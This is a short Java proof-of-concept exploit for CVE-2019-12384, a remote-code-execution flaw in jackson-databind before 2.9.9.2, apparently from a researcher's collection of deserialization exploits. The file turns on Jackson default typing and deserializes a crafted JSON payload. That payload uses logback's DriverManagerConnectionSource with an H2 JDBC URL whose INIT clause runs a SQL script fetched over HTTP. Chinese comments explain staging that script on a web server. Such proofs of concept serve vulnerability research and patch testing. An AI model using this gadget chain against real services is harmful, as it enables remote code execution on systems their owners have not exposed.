package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

/**
 * CVE-2019-12384
 * jackson-databind RCE < 2.9.9.2
 * @author threedr3am
 */
public class H2Rce {
  public static void main(String[] args) throws IOException {

    ObjectMapper objectMapper = new ObjectMapper();
    objectMapper.enableDefaultTyping();//开启 defaultTyping
    //TODO 把resources文件inject.sql放到http服务器
    String json = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", " +
        "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:80/inject.sql'\"}]";
    Object o = objectMapper.readValue(json, Object.class);//反序列化对象
    String s = objectMapper.writeValueAsString(o);//
  }
}
